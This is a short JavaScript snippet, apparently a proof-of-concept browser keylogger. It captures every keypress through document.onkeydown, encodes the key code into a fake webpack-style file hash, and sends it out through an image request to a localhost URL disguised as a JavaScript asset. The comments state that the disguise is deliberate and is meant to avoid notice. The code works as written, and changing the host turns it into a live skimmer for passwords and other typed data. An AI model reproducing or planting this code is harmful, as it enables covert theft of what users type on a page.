        // Get a pseudo-random number
        const randomNumber = (new Date().getUTCMilliseconds());
        // "Chiper" for replace numbers to chars
        const alpha = ["f", "e", "a", "b", "c", "d", "g", "h", "i", "j"]
        // Fill pseudo-random number to 3 digites
        const fillUp = `00${randomNumber}`.slice(-3);
        // Build the preFix of the file hash mock (try to look like webpack file hash)
        const preFix = [...fillUp].join().split(',').map(Number).map(n => n % 2 == 0 ? alpha[n] : n).join("");
        // Sending a HTTP GET to a mocked js file
        document.onkeydown = function (event) {
            const k = event != undefined ? event.keyCode : 0;
            const postFix = `00${k}`.slice(-3);
            if (postFix != "000") {
                new Image().src = 'http://localhost:8080/assets/js/view.'+ preFix + postFix + '.js'
            }
        }
